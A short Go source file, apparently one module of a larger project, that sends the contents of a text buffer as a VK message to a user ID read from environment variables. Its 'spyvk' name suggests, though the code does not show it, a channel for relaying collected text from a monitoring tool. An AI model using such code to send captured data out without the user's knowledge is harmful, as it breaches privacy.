package spyvk

import (
	"os"
	"github.com/bobilev/golang-chat-bot-vk"
	"fmt"
	"strconv"
)
var TextBuff = new(string)
var LastTextBuff = new(string)
func SpyVk() {
	accessToken := os.Getenv("ACCESSTOKENVK")
	if accessToken != "" {
		bot := vkchatbot.InitBot(accessToken)
		bot.Log = 2 // 0,1,2 - уровни отображения логов

		userid, _ := strconv.Atoi(os.Getenv("VKUSERID"))
		res , _ := bot.SendMessage(userid,*TextBuff)
		fmt.Println("[res]",res.MessageID)
	}

}
